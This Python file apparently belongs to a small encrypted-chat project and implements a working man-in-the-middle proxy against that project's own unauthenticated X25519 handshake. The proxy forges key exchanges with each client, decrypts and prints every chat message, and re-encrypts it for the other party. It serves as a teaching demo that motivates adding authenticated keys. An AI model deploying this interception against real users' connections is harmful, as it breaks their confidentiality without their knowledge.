"""
Active man-in-the-middle demo against ingat's unauthenticated X25519
handshake (HELLO_UNAUTH). See PROTOCOL.md.

Sits between each victim and the real server. The real server must be
started on a different port (see server.py's --port) so this process
can occupy the port victims expect to connect to by default. Victims
run the normal, unmodified client -- they never learn anything is
different.

Attack: HELLO_UNAUTH carries an ephemeral X25519 public key with
nothing binding it to who sent it. This proxy fully terminates that
exchange on both sides instead of forwarding it:

  - it captures each victim's real ephemeral public key,
  - generates its own fresh ephemeral keypair per victim and sends that
    back instead, posing as "the peer",
  - independently completes ECDH + HKDF with each victim, landing on
    two separate AES-256-GCM session keys (Alice<->MITM, Bob<->MITM --
    Alice and Bob never actually share a key with each other).

Every CHAT frame is then decrypted with the sender's session key
(printed here, proving "encryption" didn't protect the message),
re-encrypted under the other victim's session key with a fresh nonce,
and forwarded. USERNAME/PEER_READY/PEER_LEFT pass through to the real
server untouched, so its own bookkeeping keeps working -- only the
crypto-bearing frames (HELLO_UNAUTH, CHAT) are hijacked.

Neither client shows any error: nothing in HELLO_UNAUTH gives either
side anything to verify. That's exactly the gap HELLO_AUTH (defined in
crypto/handshake.py, not yet wired up -- needs crypto/ed25519.py) is
meant to close.

Usage:
    # terminal 1: hide the real server on a different port
    python3 -m src.server --port 6768

    # terminal 2: the attacker, listening on the port victims expect
    python3 -m src.mitm

    # terminals 3 and 4: victims connect completely normally
    python3 -m src.client
    python3 -m src.client
"""

import socket
import sys
import threading

from cryptography.exceptions import InvalidTag

from crypto import cipher, handshake, hkdf, x25519
from . import wire

HOST = "127.0.0.1"


def _flag_int(name: str, default: int) -> int:
    if name in sys.argv:
        return int(sys.argv[sys.argv.index(name) + 1])
    return default


LISTEN_PORT = _flag_int("--listen-port", 6767)      # port victims connect to
UPSTREAM_PORT = _flag_int("--upstream-port", 6768)  # where the real server actually is

ACCEPT_CODE = b"ACCEPTED"
REJECT_CODE = b"REJECTED"


class Pipeline:
    """One victim's leg through the proxy: victim <-> MITM <-> real server."""

    def __init__(self, pid: int, victim_conn: socket.socket, addr: str, upstream_conn: socket.socket):
        self.pid = pid
        self.victim_conn = victim_conn
        self.addr = addr
        self.upstream_conn = upstream_conn
        self.username: str | None = None
        self.real_pub: bytes | None = None     # this victim's genuine ephemeral pubkey
        self.reply_priv: bytes | None = None   # MITM's fake keypair, sent back to this victim
        self.reply_pub: bytes | None = None
        self.session_key: bytes | None = None  # MITM <-> this victim (not shared with the real peer)


class Hub:
    """Owns every active pipeline -- relaying a CHAT frame from one
    victim requires reaching into the other victim's pipeline."""

    def __init__(self):
        self.lock = threading.Lock()
        self.pipelines: dict[int, Pipeline] = {}
        self._next_pid = 0

    def add(self, victim_conn: socket.socket, addr: str, upstream_conn: socket.socket) -> Pipeline:
        with self.lock:
            pid = self._next_pid
            self._next_pid += 1
            pipeline = Pipeline(pid, victim_conn, addr, upstream_conn)
            self.pipelines[pid] = pipeline
            return pipeline

    def other(self, pid: int) -> "Pipeline | None":
        with self.lock:
            for other_pid, pipeline in self.pipelines.items():
                if other_pid != pid:
                    return pipeline
            return None

    def remove(self, pid: int) -> bool:
        """Returns True the first time this pid is removed, False on any
        later call -- both of a pipeline's pump threads call this when
        their socket drops, and only the first should log/report it."""
        with self.lock:
            return self.pipelines.pop(pid, None) is not None


_print_lock = threading.Lock()


def log(pipeline: Pipeline, msg: str):
    who = pipeline.username or pipeline.addr
    with _print_lock:
        print(f"[MITM] ({who}) {msg}")


def handle_hello_unauth(pipeline: Pipeline, payload: bytes):
    """Terminate the victim's handshake locally: capture their real key,
    hand back a forged one, and derive the session key we now share with
    them instead of their intended peer."""
    real_pub = handshake.unpack_hello_unauth(handshake.pack_frame(payload))
    pipeline.real_pub = real_pub
    log(pipeline, f"intercepted real ephemeral pubkey: {real_pub.hex()}")

    if pipeline.reply_priv is None:
        pipeline.reply_priv, pipeline.reply_pub = x25519.generate_keypair()
    log(pipeline, f"replying with forged pubkey (impersonating their peer): {pipeline.reply_pub.hex()}")
    pipeline.victim_conn.sendall(handshake.pack_hello_unauth(pipeline.reply_pub))

    shared = x25519.shared_secret(pipeline.reply_priv, pipeline.real_pub)
    pipeline.session_key = hkdf.derive_key(
        shared, salt=handshake.HKDF_SALT, info=handshake.HKDF_INFO, length=cipher.KEY_LEN
    )
    log(pipeline, f"session key established with MITM (victim believes it's end-to-end): {pipeline.session_key.hex()}")


def handle_chat(hub: Hub, pipeline: Pipeline, payload: bytes):
    nonce, ct = wire.unpack_chat(payload)
    if pipeline.session_key is None:
        log(pipeline, "received CHAT before completing handshake with us -- dropping")
        return
    try:
        plaintext = cipher.decrypt(pipeline.session_key, nonce, ct)
    except InvalidTag:
        log(pipeline, "received CHAT that failed to decrypt under our session key -- dropping")
        return
    log(pipeline, f"DECRYPTED MESSAGE: {plaintext!r}")

    peer = hub.other(pipeline.pid)
    if peer is None or peer.session_key is None:
        log(pipeline, "no peer with an established session yet -- message not forwarded")
        return
    new_nonce, new_ct = cipher.encrypt(peer.session_key, plaintext)
    peer.victim_conn.sendall(wire.pack_chat(new_nonce, new_ct))
    log(pipeline, f"re-encrypted under {peer.username or peer.addr}'s session key and forwarded")


def handle_from_victim(hub: Hub, pipeline: Pipeline, payload: bytes):
    if not payload:
        return
    msg_type = payload[0]

    if msg_type == handshake.MSG_TYPE_HELLO_UNAUTH:
        handle_hello_unauth(pipeline, payload)
        # Never forward the victim's real key upstream -- it's fully
        # intercepted and answered locally, never touches the real server.

    elif msg_type == wire.MSG_TYPE_CHAT:
        handle_chat(hub, pipeline, payload)
        # Likewise never forwarded upstream -- we deliver our own
        # re-encrypted copy straight to the peer's victim_conn instead.

    elif msg_type == wire.MSG_TYPE_USERNAME:
        pipeline.username = wire.unpack_username(payload)
        pipeline.upstream_conn.sendall(handshake.pack_frame(payload))

    else:
        # Not expected in practice; pass through unmodified rather than
        # silently dropping.
        pipeline.upstream_conn.sendall(handshake.pack_frame(payload))


def handle_from_upstream(pipeline: Pipeline, payload: bytes):
    # HELLO_UNAUTH and CHAT are fully intercepted in handle_from_victim
    # and never forwarded upstream, so only the real server's control
    # frames (PEER_READY, PEER_LEFT) should legitimately arrive here.
    # Pass them straight through to the real victim unmodified.
    pipeline.victim_conn.sendall(handshake.pack_frame(payload))


def close_pipeline(hub: Hub, pipeline: Pipeline):
    was_active = hub.remove(pipeline.pid)
    for conn in (pipeline.victim_conn, pipeline.upstream_conn):
        try:
            conn.close()
        except OSError:
            pass
    if was_active:
        with _print_lock:
            print(f"[MITM] pipeline for {pipeline.username or pipeline.addr} closed")


def pump_victim_to_upstream(hub: Hub, pipeline: Pipeline):
    frames = wire.FrameBuffer()
    try:
        while True:
            data = pipeline.victim_conn.recv(4096)
            if not data:
                break
            for payload in frames.feed(data):
                handle_from_victim(hub, pipeline, payload)
    except OSError:
        pass
    finally:
        close_pipeline(hub, pipeline)


def pump_upstream_to_victim(hub: Hub, pipeline: Pipeline):
    frames = wire.FrameBuffer()
    try:
        while True:
            data = pipeline.upstream_conn.recv(4096)
            if not data:
                break
            for payload in frames.feed(data):
                handle_from_upstream(pipeline, payload)
    except OSError:
        pass
    finally:
        close_pipeline(hub, pipeline)


def handle_victim(hub: Hub, victim_conn: socket.socket, addr):
    client_label = f"{addr[0]}:{addr[1]}"
    with _print_lock:
        print(f"[MITM] victim connected: {client_label}")

    upstream_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    upstream_conn.connect((HOST, UPSTREAM_PORT))

    greeting = upstream_conn.recv(4096)
    victim_conn.sendall(greeting)
    if greeting == REJECT_CODE:
        with _print_lock:
            print(f"[MITM] real server rejected {client_label}; forwarding rejection")
        victim_conn.close()
        upstream_conn.close()
        return

    pipeline = hub.add(victim_conn, client_label, upstream_conn)

    threading.Thread(target=pump_victim_to_upstream, args=(hub, pipeline), daemon=True).start()
    threading.Thread(target=pump_upstream_to_victim, args=(hub, pipeline), daemon=True).start()


def main():
    hub = Hub()
    print(f"[MITM] listening on {HOST}:{LISTEN_PORT}, forwarding to real server at {HOST}:{UPSTREAM_PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((HOST, LISTEN_PORT))
        listener.listen()
        while True:
            victim_conn, addr = listener.accept()
            threading.Thread(target=handle_victim, args=(hub, victim_conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
